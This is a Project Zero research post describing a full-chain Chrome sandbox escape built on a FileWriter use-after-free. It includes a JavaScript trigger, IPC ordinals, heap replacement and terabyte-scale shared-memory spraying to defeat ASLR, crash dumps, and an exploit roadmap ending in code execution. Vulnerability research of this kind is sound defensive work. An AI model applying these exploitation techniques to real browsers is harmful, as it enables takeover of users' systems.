# Virtually Unlimited Memory: Escaping the Chrome Sandbox - Project Zero

Source: https://projectzero.google/2019/04/virtually-unlimited-memory-escaping.html
Captured verbatim (article body extracted from HTML) on 2026-11-12.

---

Posted by Mark Brand, Exploit Technique Archaeologist.

## Introduction

After discovering a [collection](https://bugs.chromium.org/p/project-zero/issues/list?can=1&q=-status%3AInvalid+%22MojoJS%22+finder%3Amarkbrand&colspec=ID+Status+Restrict+Finder+Reported+Remaining+CVE+Vendor+Product+Summary&cells=ids) of possible sandbox escape vulnerabilities in Chrome, it seemed worthwhile to [exploit](https://bugs.chromium.org/p/project-zero/issues/detail?id=1755#c3) one of these issues as a full-chain exploit together with a renderer vulnerability to get a better understanding of the mechanics required for a modern Chrome exploit. Considering the available bugs, the most likely appeared to be [issue 1755](https://bugs.chromium.org/p/project-zero/issues/detail?id=1755), a use-after-free with parallels to classic Javascript engine callback bugs. This is a good candidate because of the high level of control the attacker has both over the lifetime of the free’d object, and over the timing of the later use of the object.


Apologies in advance for glossing over a lot of details about how the Mojo IPC mechanisms function - there’ll hopefully be some future blogposts explaining in more detail how the current Chrome sandbox interfaces look, but there’s a lot to explain!


For the rest of this blog post, we’ll be considering the last stable 64-bit release of Desktop Chrome for Windows before this issue was fixed, 71.0.3578.98.

## Getting started

One of the most interesting things that we noticed during our research into the Chrome Mojo IPC layer is that it’s actually possible to make IPC calls directly from [Javascript](https://chromium.googlesource.com/chromium/src/+/master/mojo/public/js/README.md) in Chrome! Passing the command line flag ‘--enable-blink-features=MojoJS’ to Chrome will enable this - and we used this feature to implement a Mojo fuzzer, which found some of the bugs reported.


Knowing about this feature, the cleanest way to implement a full Chrome chain would be to use a renderer exploit to enable these bindings in the running renderer, and then do our privilege elevation from Javascript!

## Exploiting the renderer

[\_tsuro](https://twitter.com/_tsuro)happened to have been working on an exploit for CVE-2019-5782, a nice bug in the v8 typer that was discovered by

[SOrryMybad](https://twitter.com/S0rryMybad)and used at the Tian Fu Cup. I believe they have an upcoming blog post on the issue, so I’ll leave the details to them.


The bug resulted from incorrectly estimating the possible range of \`arguments.length\`; this can then be leveraged together with the (BCE) Bounds-Check-Elimination pass in the JIT.  Exploitation is very similar to other typer bugs - you can find the exploit in ‘many\_args.js’. Note that as a result of \_tsuro’s work, the v8 team [have removed the BCE optimisation](https://bugs.chromium.org/p/v8/issues/detail?id=8806) to make it harder to exploit such issues in the typer!


The important thing here is that we’ll need to have a stable exploit - in order to launch the sandbox escape, we need to enable the Mojo bindings; and the easiest way to do this needs us to reload the main frame, which will mean that any objects we leave in a corrupted state will become fair game for garbage collection.

## Talking to the Browser Process

Looking through the Chrome source code, we can see that the Mojo bindings are added to the Javascript context in [RenderFrameImpl::DidCreateScriptContext](https://cs.chromium.org/chromium/src/content/renderer/render_frame_impl.cc?rcl=8095e5d9d219ceff1aab5d00aaec59d629d50270&l=5453), based on the member variable enabled\_bindings\_. So, to mimic the command line flag we can use our read/write to set that value to BINDINGS\_POLICY\_MOJO\_WEB\_UI, and force the creation of a new ScriptContext for the main frame and we should have access to the bindings!


It’s slightly painful to get hold of the RenderFrameImpl for the current frame, but by following a chain of pointers from the global context object we can locate chrome\_child.dll, and find the global \`g\_frame\_map\`, which is a map from blink::Frame pointers to RenderFrameImpl pointers. For the purposes of this exploit, we assume that there is only a single entry in this map; but it would be simple to extend this to find the right one. It’s then trivial to set the correct flag and reload the page - see \`enable\_mojo.js\` for the implementation.


Note that Chrome randomizes the IPC ordinals at build time, so in addition to enabling the bindings, we also need to find the correct ordinals for every IPC method that we want to call. This can be resolved in a few minutes of time in a disassembler of your choice; given that the renderer needs to be able to call these IPC methods, this is just a slightly annoying obfuscation that we could engineer around if we were trying to support more Chrome builds, but for the one version we’re supporting here it’s sufficient to modify the handful of javascript bindings we need:


var kBlob\_GetInternalUUID\_Name = 0x2538AE26;


var kBlobRegistry\_Register\_Name = 0x2158E98A;

var kBlobRegistry\_RegisterFromStream\_Name = 0x719E4F82;


var kFileSystemManager\_Open\_Name = 0x305E02BE;

var kFileSystemManager\_CreateWriter\_Name = 0x63B8D2A6;


var kFileWriter\_Write\_Name = 0x64D4FC1C;

## The bug

So we’ve got access to the IPC interfaces from Javascript - what now?


The bug that we’re looking at is an issue in the implementation of the FileWriter interface of the [FileSystem API](https://www.html5rocks.com/en/tutorials/file/filesystem/). This is the interface description for the FileWriter interface, which is an IPC endpoint vended by the privileged browser process to the unprivileged renderer process to allow the renderer to perform brokered file writes to special sandboxed filesystems:


// Interface provided to the renderer to let a renderer write data to a file.

interface FileWriter {

// Write data from |blob| to the given |position| in the file being written

// to. Returns whether the operation succeeded and if so how many bytes were

// written.

// TODO(mek): This might need some way of reporting progress events back to

// the renderer.

Write(uint64 position, Blob blob) => (mojo\_base.mojom.FileError result,

uint64 bytes\_written);


// Write data from |stream| to the given |position| in the file being written

// to. Returns whether the operation succeeded and if so how many bytes were

// written.

// TODO(mek): This might need some way of reporting progress events back to

// the renderer.

WriteStream(uint64 position, handle\<data\_pipe\_consumer> stream) =>

(mojo\_base.mojom.FileError result, uint64 bytes\_written);


// Changes the length of the file to be |length|. If |length| is larger than

// the current size of the file, the file will be extended, and the extended

// part is filled with null bytes.

Truncate(uint64 length) => (mojo\_base.mojom.FileError result);

};


The vulnerability was in the implementation of the first method, Write. However, before we can properly understand the bug, we need to understand the lifetime of the FileWriter objects. The renderer can request a FileWriter instance by using one of the methods in the FileSystemManager interface:


// Interface provided by the browser to the renderer to carry out filesystem

// operations. All \[Sync\] methods should only be called synchronously on worker

// threads (and asynchronously otherwise).

interface FileSystemManager {

// ...


// Creates a writer for the given file at |file\_path|.

CreateWriter(url.mojom.Url file\_path) =>

(mojo\_base.mojom.FileError result,

blink.mojom.FileWriter? writer);


// ...

};



void FileSystemManagerImpl::CreateWriter(const GURL& file\_path,

CreateWriterCallback callback) {

DCHECK\_CURRENTLY\_ON(BrowserThread::IO);


FileSystemURL url(context\_->CrackURL(file\_path));

base::Optional\<base::File::Error> opt\_error = ValidateFileSystemURL(url);

if (opt\_error) {

std::move(callback).Run(opt\_error.value(), nullptr);

return;

}

if (!security\_policy\_->CanWriteFileSystemFile(process\_id\_, url)) {

std::move(callback).Run(base::File::FILE\_ERROR\_SECURITY, nullptr);

return;

}


blink::mojom::FileWriterPtr writer;

mojo::MakeStrongBinding(std::make\_unique\<storage::FileWriterImpl>(

url, context\_->CreateFileSystemOperationRunner(),

blob\_storage\_context\_->context()->AsWeakPtr()),

MakeRequest(&writer));

std::move(callback).Run(base::File::FILE\_OK, std::move(writer));

}


The implication here is that if everything goes correctly, we’re returning a std::unique\_ptr\<storage::FileWriterImpl> bound to a mojo::StrongBinding. A strong binding means that the lifetime of the object is bound to the lifetime of the Mojo interface pointer - this means that the other side of the connection can control the lifetime of the object - and at any point where the code in storage::FileWriterImpl yields control of the [sequence](https://chromium.googlesource.com/chromium/src/+/lkgr/docs/threading_and_tasks.md#posting-a-sequenced-task) associated with that binding, the connection could be closed and the instance could be free’d.


This gives us a handle to the blink::mojom::FileWriter Mojo interface described [here](https://cs.chromium.org/chromium/src/third_party/blink/public/mojom/filesystem/file_writer.mojom?type=cs&q=FileWriter+f:mojom$&sq=package:chromium&g=0&l=11); the function of interest to us is the Write method, which has a handle to a blink::mojom::Blob as one of it’s parameters. We’ll look at this Blob interface again shortly.



void FileWriterImpl::Write(uint64\_t position,

blink::mojom::BlobPtr blob,

WriteCallback callback) {

blob\_context\_->GetBlobDataFromBlobPtr(

std::move(blob),

base::BindOnce(&FileWriterImpl::DoWrite, base::Unretained(this),

std::move(callback), position));

}


Now, it’s not immediately obvious that there’s an issue here; but in the Chrome codebase instances of base::Unretained which aren’t immediately obviously correct are often worth further investigation (this creates an unchecked, unowned reference - see Chrome [documentation](https://www.chromium.org/developers/coding-style/important-abstractions-and-data-structures)). So; this code can only be safe if GetBlobDataFromBlobPtr always synchronously calls the callback, or if destroying this will ensure that the callback is never called. Since blob\_context\_ isn’t owned by this, we need to look at the [implementation](https://chromium.googlesource.com/chromium/src/+/4d526b4f33f813b0ccd3d87a068f26b702d6aff8/storage/browser/blob/blob_storage_context.cc#80) of GetBlobDataFromBlobPtr, and the way in which it uses callback:


void BlobStorageContext::GetBlobDataFromBlobPtr(

blink::mojom::BlobPtr blob,

base::OnceCallback\<void(std::unique\_ptr\<BlobDataHandle>)> callback) {

DCHECK(blob);

blink::mojom::Blob\* raw\_blob = blob.get();

raw\_blob->GetInternalUUID(mojo::WrapCallbackWithDefaultInvokeIfNotRun(

base::BindOnce(

\[\](blink::mojom::BlobPtr, base::WeakPtr\<BlobStorageContext> context,

base::OnceCallback\<void(std::unique\_ptr\<BlobDataHandle>)> callback,

const std::string& uuid) {

if (!context || uuid.empty()) {

std::move(callback).Run(nullptr);

return;

}

std::move(callback).Run(context->GetBlobDataFromUUID(uuid));

},

std::move(blob), AsWeakPtr(), std::move(callback)),

""));

}


The code above is calling an asynchronous Mojo IPC method GetInternalUUID on the blob parameter that’s passed to it, and then (in a callback) when that method returns it’s using the returned UUID to find the associated blob data (GetBlobDataFromUUID), and calling the callback parameter with this data as an argument.


We can see that the callback is passed into the return callback for an asynchronous Mojo function exposed by the Blob [interface](https://cs.chromium.org/chromium/src/third_party/blink/public/mojom/blob/blob.mojom):


// This interface provides access to a blob in the blob system.

interface Blob {

// Creates a copy of this Blob reference.

Clone(Blob& blob);


// Creates a reference to this Blob as a DataPipeGetter.

AsDataPipeGetter(network.mojom.DataPipeGetter& data\_pipe\_getter);


// Causes the entire contents of this blob to be written into the given data

// pipe. An optional BlobReaderClient will be informed of the result of the

// read operation.

ReadAll(handle\<data\_pipe\_producer> pipe, BlobReaderClient? client);


// Causes a subrange of the contents of this blob to be written into the

// given data pipe. If |length| is -1 (uint64\_t max), the range's end is

// unbounded so the entire contents are read starting at |offset|. An

// optional BlobReaderClient will be informed of the result of the read

// operation.

ReadRange(uint64 offset, uint64 length, handle\<data\_pipe\_producer> pipe,

BlobReaderClient? client);


// Reads the side-data (if any) associated with this blob. This is the same

// data that would be passed to OnReceivedCachedMetadata if you were reading

// this blob through a blob URL.

ReadSideData() => (array\<uint8>? data);


// This method is an implementation detail of the blob system. You should not

// ever need to call it directly.

// This returns the internal UUID of the blob, used by the blob system to

// identify the blob.

GetInternalUUID() => (string uuid);

};


This means that we can provide an implementation of this Blob interface hosted in the renderer process; pass an instance of that implementation into the FileWriter interface’s Write method, and we’ll get a callback from the browser process to the renderer process during the execution of GetBlobDataFromBlobPtr, during which we can destroy the FileWriter object. The use of base::Unretained here would be dangerous regardless of this callback, but having it scheduled in this way makes it much cleaner to exploit.

## Step 1: A Trigger

First we need to actually reach the bug - this is a minimal trigger from Javascript using the MojoJS bindings we enabled earlier. A complete sample is attached to the bugtracker entry - the file is ‘trigger.js’


async function trigger() {

// we need to know the UUID for a valid Blob

let blob\_registry\_ptr = new blink.mojom.BlobRegistryPtr();

Mojo.bindInterface(blink.mojom.BlobRegistry.name,

mojo.makeRequest(blob\_registry\_ptr).handle, "process");


let bytes\_provider = new BytesProviderImpl();

let bytes\_provider\_ptr = new blink.mojom.BytesProviderPtr();

bytes\_provider.binding.bind(mojo.makeRequest(bytes\_provider\_ptr));


let blob\_ptr = new blink.mojom.BlobPtr();

let blob\_req = mojo.makeRequest(blob\_ptr);


let data\_element = new blink.mojom.DataElement();

data\_element.bytes = new blink.mojom.DataElementBytes();

data\_element.bytes.length = 1;

data\_element.bytes.embeddedData = \[0\];

data\_element.bytes.data = bytes\_provider\_ptr;


await blob\_registry\_ptr.register(blob\_req, 'aaaa', "text/html", "", \[data\_element\]);


// now we have a valid UUID, we can trigger the bug

let file\_system\_manager\_ptr = new blink.mojom.FileSystemManagerPtr();

Mojo.bindInterface(blink.mojom.FileSystemManager.name,

mojo.makeRequest(file\_system\_manager\_ptr).handle, "process");


let host\_url = new url.mojom.Url();

host\_url.url = window.location.href;


let open\_result = await file\_system\_manager\_ptr.open(host\_url, 0);


let file\_url = new url.mojom.Url();

file\_url.url = open\_result.rootUrl.url + '/aaaa';


let file\_writer = (await file\_system\_manager\_ptr.createWriter(file\_url)).writer;


function BlobImpl() {

this.binding = new mojo.Binding(blink.mojom.Blob, this);

}


BlobImpl.prototype = {

getInternalUUID: async (arg0) => {

// here we free the FileWriterImpl in the callback

create\_writer\_result.writer.ptr.reset();


return {'uuid': 'aaaa'};

}

};


let blob\_impl = new BlobImpl();

let blob\_impl\_ptr = new blink.mojom.BlobPtr();

blob\_impl.binding.bind(mojo.makeRequest(blob\_impl\_ptr));


file\_writer.write(0, blob\_impl\_ptr);

}

## Step 2: Replacement

Although it’s likely not to be of much use in the end, I usually like to start the process of exploiting a use-after-free by replacing the object with completely attacker controlled data - although without an ASLR bypass or an information leak, it’s unlikely we can do anything useful with this primitive, but it’s often useful to get an understanding of the allocation patterns around the object involved, and it gives a clear crash that’s useful to demonstrate the likely exploitability of the issue.


On the Windows build that we’re looking at, the size of the FileWriterImpl is 0x140 bytes. I originally looked at using the Javascript Blob API directly to create allocations, but this causes a number of additional temporary allocations of the same size, which significantly reduces reliability. A better way to cause allocations of a controlled size with controlled data in the browser process is to register new Blobs using the BlobRegistry registerFromStream method - this will perform all of the secondary allocations during the initial call to registerFromStream, and we can then trigger a single allocation of the desired size and contents later by writing data into the DataPipeProducerHandle.


We can test this (see ‘trigger\_replace.js’), and indeed it does reliably replace the free’d object with a buffer containing completely controlled bytes, and crashes in the way we’d expect:


(1594.226c): Access violation - code c0000005 (first chance)

First chance exceptions are reported before any exception handling.

This exception may be expected and handled.

chrome!storage::FileSystemOperationRunner::GetMetadata+0x33:

00007ffc\`362a1a99 488b4908        mov     rcx,qword ptr \[rcx+8\] ds:23232323\`2323232b=????????????????

0:002> r

rax=0000ce61f98b376e rbx=0000021b30eb4bd0 rcx=2323232323232323

rdx=0000021b30eb4bd0 rsi=0000005ae4ffe3e0 rdi=2323232323232323

rip=00007ffc362a1a99 rsp=0000005ae4ffe2f0 rbp=0000005ae4ffe468

r8=0000005ae4ffe35c  r9=0000005ae4ffe3e0 r10=0000021b30badbf0

r11=0000000000000000 r12=0000000000000000 r13=0000005ae4ffe470

r14=0000000000000001 r15=0000005ae4ffe3e8

iopl=0         nv up ei pl nz na pe nc

cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202

chrome!storage::FileSystemOperationRunner::GetMetadata+0x33:

00007ffc\`362a1a99 488b4908        mov     rcx,qword ptr \[rcx+8\] ds:23232323\`2323232b=????????????????

0:002> k

\# Child-SP          RetAddr           Call Site

00 0000005a\`e4ffe2f0 00007ffc\`362a74ed chrome!storage::FileSystemOperationRunner::GetMetadata+0x33 01 0000005a\`e4ffe3a0 00007ffc\`362a7aef chrome!storage::FileWriterImpl::DoWrite+0xed

…

## Step 3: Information Leak

It’s not much use controlling the data in the free’d object, when we need to be able to put valid pointers in there - so at this point we need to consider how the free’d object is used, and what options we have for replacing the free’d object with a different type of object, essentially turning the use-after-free into a type-confusion in a way that will achieve something useful to us.


Looking through objects of the same size in windbg however did not provide any immediate answers - and since most of the methods being called from DoWrite are non-virtual, we actually need quite a large amount of structure to be correct in the replacing object.


void FileWriterImpl::DoWrite(WriteCallback callback,

uint64\_t position,

std::unique\_ptr\<BlobDataHandle> blob) {

if (!blob) {

std::move(callback).Run(base::File::FILE\_ERROR\_FAILED, 0);

return;

}

// FileSystemOperationRunner assumes that positions passed to Write are always

// valid, and will NOTREACHED() if that is not the case, so first check the

// size of the file to make sure the position passed in from the renderer is

// in fact valid.

// Of course the file could still change between checking its size and the

// write operation being started, but this is at least a lot better than the

// old implementation where the renderer only checks against how big it thinks

// the file currently is.

operation\_runner\_->GetMetadata(

url\_, FileSystemOperation::GET\_METADATA\_FIELD\_SIZE,

base::BindRepeating(&FileWriterImpl::DoWriteWithFileInfo,

base::Unretained(this),

base::AdaptCallbackForRepeating(std::move(callback)),

position, base::Passed(std::move(blob))));

}


So; we’re going to make a non-virtual call to [FileSystemOperationRunner::GetMetadata](https://chromium.googlesource.com/chromium/src/+/d755a8cf625f40b2b2a4c7e96adb8337b135aa68/storage/browser/fileapi/file_system_operation_runner.cc#174) with a this pointer taken from inside the free’d object:


OperationID FileSystemOperationRunner::GetMetadata(

const FileSystemURL& url,

int fields,

GetMetadataCallback callback) {

base::File::Error error = base::File::FILE\_OK;

std::unique\_ptr\<FileSystemOperation> operation = base::WrapUnique(

file\_system\_context\_->CreateFileSystemOperation(url, &error));

...

}


And that will then make a non-virtual call to [FileSystemContext::CreateFileSystemOperation](https://chromium.googlesource.com/chromium/src/+/1606ab8b04ea62cdbd4243414936168971d6a677/storage/browser/fileapi/file_system_context.cc#524) with a this pointer taken from inside whatever the previous this pointer pointed to…


FileSystemOperation\* FileSystemContext::CreateFileSystemOperation(

const FileSystemURL& url, base::File::Error\* error\_code) {

...


FileSystemBackend\* backend = GetFileSystemBackend(url.type());

if (!backend) {

if (error\_code)

\*error\_code = base::File::FILE\_ERROR\_FAILED;

return nullptr;

}


...

}


Which will then finally expect to be able to lookup a FileSystemBackend pointer from an std::map contained inside it!


FileSystemBackend\* FileSystemContext::GetFileSystemBackend(

FileSystemType type) const {

auto found = backend\_map\_.find(type);

if (found != backend\_map\_.end())

return found->second;

NOTREACHED() \<\< "Unknown filesystem type: " \<\< type;

return nullptr;

}


This is quite a comprehensive set of constraints. (If we can meet them all, the call to backend->CreateFileSystemOperation is finally a virtual call which would be where we’d hope to achieve a useful side-effect).


After looking through the types of the same size (0x140 bytes), nothing jumped out as being both easy to allocate in a controlled way, and also overlapping in a compatible way - so we can instead consider an alternative approach. On Windows, the freeing of a heap block doesn’t (immediately) corrupt the data it contains - so if we can groom to make sure that the FileWriterImpl allocation isn’t reused, we can instead replace the FileSystemOperationRunner object directly, and access it through the stale pointer. This reduces one dereference from our constraints, and means we are looking in a different size class (0x80 bytes)… There are roughly 1000 object types of this size, and again nothing is obviously useful, so maybe we can consider alternative solutions...

## Step 4: Information Leak (round #2)

Tired of staring at structure layouts in the debugger, time to consider any alternative we could come up with. The ASLR implementation on Windows means that if the same library is loaded in multiple processes, it will be at the same base address; so any library loaded in the renderer will be loaded at a known address in the browser process.


There are a few objects we could replace the FileSystemOperationRunner with that would line up the FileSystemContext pointer to controlled string data; we could use this to fake the first/begin node of the backend\_map\_ with a pointer into the data section of one of the modules that we can locate, and there line things up correctly so that we could lookup the first entry. This only required an even smaller set of constraints:


ptr = getPtr(address)


getUint8(ptr + 0x19) == 0

getUint32(ptr + 0x20) == 0

obj = getPtr(ptr + 0x28)


vtable = getPtr(obj)


function = getPtr(vtable + 0x38)


The set of addresses which meet these constraints, unfortunately, does not really produce any useful primitives.

## Step 5: ASLR Bypass

Having almost completely given up, we remembered one of the quirks related to [issue 1642](https://bugs.chromium.org/p/project-zero/issues/detail?id=1642), a bug in the Mojo core code. Specifically; when the receiving end of a Mojo connection receives a [DataPipe\*Dispatcher](https://chromium.googlesource.com/chromium/src/+/66e24a8793615bd9d5c238b1745b093090e1f72d/mojo/core/data_pipe_consumer_dispatcher.cc#361) object, it will immediately map an associated shared memory section (the mapping occurs inside the call to InitializeNoLock).


Since there’s no memory or virtual address space limit in the browser process, this suggests that in fact, we may be able to completely bypass ASLR without an information leak if we can simply spray the virtual address space of the browser with shared memory mappings. Note - the renderer limits will still be applied, so we need to find a way to do this without exceeding the renderer limits. This should be fairly trivial from native code running in the renderer; we can simply duplicate handles to the same shared memory page, and repeatedly send them - but it would be nice to stay in Javascript.


Looking into the IDL for the MojoHandle interface in MojoJS bindings, we can note that while we can’t clone DataPipe handles, we can clone SharedBuffer handles.


interface MojoHandle {

...

// TODO(alokp): Create MojoDataPipeProducerHandle and MojoDataPipeConsumerHandle,

// subclasses of MojoHandle and move the following member functions.

MojoWriteDataResult writeData(BufferSource buffer, optional MojoWriteDataOptions options);

MojoReadDataResult queryData();

MojoReadDataResult discardData(unsigned long numBytes, optional MojoDiscardDataOptions options);

MojoReadDataResult readData(BufferSource buffer, optional MojoReadDataOptions options);


// TODO(alokp): Create MojoSharedBufferHandle, a subclass of MojoHandle

// and move the following member functions.

MojoMapBufferResult mapBuffer(unsigned long offset, unsigned long numBytes);

MojoCreateSharedBufferResult duplicateBufferHandle(optional MojoDuplicateBufferHandleOptions options);

};


Unfortunately, SharedBuffers are used much less frequently in the browser process interfaces, and they’re not automatically mapped when they are deserialized, so they’re less useful for our purposes. However, since both SharedBuffers and DataPipes are backed by the same operating-system level primitives, we can still use this to our advantage; by creating an equal number of DataPipes with small shared memory mappings, and clones of a single, large SharedBuffer, we can then use our arbitrary read-write to swap the backing buffers!


As we can see in the VMMap screenshot above - this is both effective and quick! The first test performed a 16-terabyte spray, which got a bit laggy, but in the real-world about 3.5-terabytes appears sufficient to get a reliable, predictable address. Finally, a chance to cite SkyLined’s exploit for [MS04-040](https://www.exploit-db.com/exploits/612) in a modern 64-bit Chrome exploit!


A little bit of fiddling later:


rax=00000404040401e8 rbx=000001fdba193480 rcx=00000404040401e8

rdx=000001fdba193480 rsi=00000002f39fe97c rdi=00000404040400b0

rip=00007ffd87270258 rsp=00000002f39fe8c0 rbp=00000002f39fea88

r8=00000404040400b0  r9=00000002f39fe8e4 r10=00000404040401f0

r11=0000000000000000 r12=0000000000000000 r13=00000002f39fea90

r14=0000000000000001 r15=00000002f39fea08

iopl=0         nv up ei pl nz na po nc

cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206

chrome!storage::FileSystemContext::CreateFileSystemOperation+0x4c:

00007ffd\`87270258 41ff5238        call    qword ptr \[r10+38h\] ds:00000404\`04040228=4141414141414141

## Roadmap

Ok, at this point we should have all the heavy machinery that we need - the rest is a matter of engineering. For the detail-oriented; you can find a full, working exploit in the bugtracker, and you should be able to identify the code handling all of the following stages of the exploit:


1. Arbitrary read-write in the renderer
2. Enable MojoJS bindings
3. Launch sandbox escape
4. Sandbox escape
5. Arbitrary read-write in the renderer (again…)
6. Locate necessary libraries for pivots and ROP chain in the renderer address space
7. Build a page of data that we’re going to spray in the browser address space containing fake FileSystemOperationRunner, FileSystemContext, FileSystemBackend objects
8. Trigger the bug
9. Replace the free’d FileWriterImpl with a fake object that uses the address that we’ll target with our spray as the FileSystemOperationRunner pointer
10. Spray \~4tb of copies of the page we built in 2c into the browser process address space
11. Return from the renderer to FileWriterImpl::DoWrite in the browser process, pivoting into our ROP chain and payload
12. Pop calc
13. Clean things up so that the browser can continue running

## Conclusions

It’s interesting to have another case where we’ve been able to use weaknesses in ASLR implementations to achieve a working exploit without needing an information leak.


There were two key ASLR weaknesses that enabled reliable exploitation of this bug:

- No inter-process randomisation on Windows (which is also a limitation on MacOS/iOS) which enabled locating valid code addresses in the target process without an information-leak.
- No limitations on address-space usage in the Chrome Browser Process, which enabled predicting valid data addresses in the heap-spray.

Without both of these primitives, it would be more difficult to exploit this vulnerability, and would likely have pushed past available motivation (better to keep looking for a better vulnerability, or an additional information leak since the use-after-free wasn’t readily usable as an information leak).
